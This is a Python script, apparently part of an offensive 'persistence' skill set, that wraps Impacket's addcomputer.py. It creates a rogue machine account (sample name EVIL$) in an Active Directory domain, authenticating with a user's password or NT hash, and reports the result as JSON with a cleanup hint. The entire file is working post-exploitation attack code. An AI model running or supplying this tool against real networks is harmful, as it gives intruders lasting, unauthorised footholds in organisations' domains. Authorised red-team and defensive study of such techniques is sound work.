#!/usr/bin/env python3
"""Wrap addcomputer.py to create a machine account for persistence.

Usage:
  python skills/persistence/scripts/machine_account.py -d corp.local -u user -p Pass --dc-ip 10.0.0.10 --computer-name EVIL$ --computer-pass 'Comp@ss1'
"""

from __future__ import annotations

import argparse
import json
import shutil
import subprocess
import sys
from pathlib import Path


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Add a machine account via addcomputer.py."
    )
    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("-u", "--user", required=True)
    auth = parser.add_mutually_exclusive_group(required=True)
    auth.add_argument("-p", "--password")
    auth.add_argument("-H", "--hash", dest="nt_hash")
    parser.add_argument("--dc-ip", required=True)
    parser.add_argument(
        "--computer-name", required=True, help="New machine account name (e.g. EVIL$)"
    )
    parser.add_argument(
        "--computer-pass",
        default="Comp123!Comp",
        help="Password for the new machine account",
    )
    return parser.parse_args()


def _resolve_cmd(tool: str | None) -> list[str]:
    if not tool:
        return ["addcomputer.py"]
    if Path(tool).suffix == ".py":
        return [sys.executable, tool]
    return [tool]


def main() -> int:
    args = parse_args()
    tool = shutil.which("impacket-addcomputer") or shutil.which("addcomputer.py")
    tool_cmd = _resolve_cmd(tool)

    target = f"{args.domain}/{args.user}"
    command = tool_cmd + [
        "-dc-ip",
        args.dc_ip,
        "-computer-name",
        args.computer_name,
        "-computer-pass",
        args.computer_pass,
    ]
    if args.password:
        command += ["-password", args.password]
    else:
        command += ["-hashes", f":{args.nt_hash}"]
    command.append(target)

    payload: dict[str, object] = {
        "tool": "addcomputer.py",
        "tool_found": bool(tool),
        "command": command,
        "computer_name": args.computer_name,
        "domain": args.domain,
        "cleanup_hint": (
            f"Remove with: net rpc machine delete {args.computer_name} "
            f"-U {args.domain}/{args.user} -S {args.dc_ip}"
        ),
    }

    if not tool:
        print(
            "[!] addcomputer.py not found on PATH. Printing command only.",
            file=sys.stderr,
        )
        print(json.dumps(payload, indent=2, ensure_ascii=False))
        return 0

    result = subprocess.run(command, capture_output=True, text=True, check=False)
    payload["return_code"] = result.returncode
    payload["stdout"] = result.stdout.strip()
    payload["stderr"] = result.stderr.strip()
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0 if result.returncode == 0 else result.returncode


if __name__ == "__main__":
    raise SystemExit(main())
